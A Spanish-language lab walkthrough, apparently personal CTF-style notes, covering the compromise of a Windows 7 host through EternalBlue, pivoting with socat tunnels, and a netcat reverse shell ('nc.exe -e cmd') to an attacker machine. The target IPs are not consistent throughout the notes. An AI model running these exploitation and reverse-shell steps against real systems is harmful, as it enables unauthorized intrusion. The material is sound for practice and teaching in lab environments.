[[192.168.100.7(Nagini)]]
#Dumbledore 
- Pwned

Haremos un scaneo de red con [[NMAP]]
`nmap -sT -Pn --top-ports 500 --open -T5 -v -n 192.168.100.9`

```python
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
554/tcp  open  rtsp
5357/tcp open  wsdapi
```

Para enumerar el servicio SMB usaremos [[CRACKMAPEXEC-NETEXEC]] con:
`netexec smb 192.168.100.4 2>/dev/null`
```python
SMB 192.168.100.4 445 DUMBLEDORE-PC    
[*] Windows 7 / Server 2008 R2 Build 7601 x64 
(name:DUMBLEDORE-PC) 
(domain:Dumbledore-PC) 
(signing:False) 
(SMBv1:True) 
```

Estamos ante un Windows 7 con el puerto SMB expuesto.
Como es una versión y un puerto vulnerables vamos a realizar un ataque de eternalBlue
Usáremos el repositorio de GitHub: `https://github.com/3ndG4me/AutoBlue-MS17-010`
Dentro de esta herramienta usaremos primero `eternal_checker.py` usaremos para saber si la maquina es vulnerable: `python3 eternal_checker.py 192.168.100.9`

Ahora automatizaremos el proceso de obtener una consola interactiva con la herramienta `zzz_exploit.py` ejecutándola con `python3 zzz_exploit.py 192.168.100.9` y conseguiremos usa Shell dentro de la maquina Windows.

Una vez dentro si hacemos `ipconfig` veremos que dentro se encuentra otra interfaz de red con  [[172.18.0.6(Dumbledore)]] 

Nos descargamos netcat para Windows desde `https://eternallybored.org/misc/netcat/`
Lo descomprimimos en un directorio llamado netcat `unzip -d netcat netcat-win32-1.12.zip`
Y el archivo `nc64.exe` deberemos compartirlo con la maquina Windows al directorio `C:\Windows\temp`

Para poder realizarlo tendremos que hacer con socat dos tuneles:
Nagini: `./socat TCP-LISTEN:445,fork TCP:10.10.0.4:445`
Aragog: `./socat TCP-LISTEN:445,fork TCP:192.168.1.21:445`

En la maquina atacante serviremos el puerto 445 `impacket-smbserver smbFolder $(pwd) -smb2support` y en la maquina Windows nos descargamos el archivo que queremos con: `copy \\192.168.1.21\smbFolder\nc64.exe C:\Windows\Temp\nc.exe`

En la maquina atacante nos ponemos en escucha con: `rlwrap nc -nlvp 445`
Lo ejecutamos en la maquina Windows `C:\Windows\Temp\nc.exe -e cmd 192.168.1.21 445`

Obtendremos una shell 